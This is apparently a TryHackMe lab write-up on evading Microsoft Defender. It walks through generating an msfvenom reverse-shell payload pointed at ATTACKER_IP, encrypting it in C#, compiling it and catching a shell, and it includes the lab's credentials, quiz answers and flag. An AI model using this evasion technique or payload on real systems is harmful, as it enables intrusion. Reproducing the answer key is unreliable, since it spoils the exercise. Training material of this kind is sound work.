
Task 1 - Introduction
--------------------------------

In this room, we'll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We'll look at different techniques available to us as attackers and discuss the pros and cons of every one of them.

### Objectives

-   Learn how shellcodes are made.
-   Explore the pros and cons of staged payloads.
-   Create stealthy shellcodes to avoid AV detection.

### Prerequisites

It is recommended to have some prior knowledge of [how antivirus software works](https://tryhackme.com/room/introtoav) and a basic understanding of encryption and encoding. While not strictly required, some knowledge of basic assembly language can also be helpful. Also, we recommend having a basic understanding of reading code and understanding functions (C, C#).

__Questions__

Click and continue learning!
Answer: _None Required_


Task 2 - Challenge
--------------------------------

In this challenge, we prepared a Windows machine with a web application to let you upload your payloads. Once uploaded, the payloads will be checked by an AV and executed if found to be clean of malware. The main goal of this challenge is to evade Antivirus software installed on the VM and capture the flag in the file system. Feel free to try all of the techniques discussed throughout the room by uploading them to `http://MACHINE_IP/`.

Points to remember:

-   Try to combine the techniques discussed in this room.
-   The website supports EXE files only.
-   Once the AV scans the uploaded file and no malicious code is detected, the file gets executed. Thus, if everything is put together correctly, then you should receive a reverse shell.

![[avevationshellcode-0.png]]

You can ignore the questions for this task for now, but be sure to come back to them once you have successfully bypassed the AV and gained a shell.

Deploy the attached VM to follow up with the content of the room before continuing to the next section! The VM will deploy in-browser and should appear automatically in the Split View. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. If you prefer connecting via RDP, you can do so with the following credentials:

`thm/Password321`

You will also need the AttackBox for some tasks, so this is also a good moment to start it.

This section is a bit more hands on so I am posting the steps here on how I solved this challenge.

You first start the Windows machine, and either the attackbox or your own and VPN into THM.

I wanted to first see how the Antivirus scanner interpreted a standard msfvenom payload so I generated this one on the Attackbox and uploaded it to their AV Scanner which is running on the Windows host.
![[avevationshellcode-1.jpg]]

Of course it was flagged:
![[avevationshellcode-2.jpg]]

So I make an reverse shell with msfvenom in CSharp format from the attackbox:
```bash
$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

Then I copied the output and put it into the `C:\Tools\CS Files\Encryptor.cs` source as shown below:
![[avevationshellcode-4.jpg]]

Now we compile it with csc.exe:
![[avevationshellcode-5.jpg]]

Now we can run the executable to get an encrypted version of our code. We still need to embed this in the final version which will decrypt and run the payload. So we copy what it spits out below:
![[avevationshellcode-6.jpg]]

Now we put it into the `C:\Tools\CS Files\EncStageless.cs` file as shown:
![[avevationshellcode-7.jpg]]

Now compile it:
![[avevationshellcode-8.jpg]]

Let's check with the AV Scanner and see if it's ok:
![[avevationshellcode-9.jpg]]

Start a listener on the attackbox per the original settings for LHOST/LPORT you ran in the msfvenom command above:
![[avevationshellcode-3.jpg]]

After running the `C:\> .\EncStageless.exe` you get your reverse shell:
![[avevationshellcode-10.jpg]]

Here is the user's flag:
![[avevationshellcode-11.jpg]]

__Questions__

Which Antivirus software is running on the VM?
Answer: _Microsoft Defender_

What is the name of the user account to which you have access?
Answer: _av-victim_

Establish a working shell on the victim machine and read the file on the user's desktop. What is the flag?
Answer: _THM{H3ll0-W1nD0ws-Def3nd3r!}_





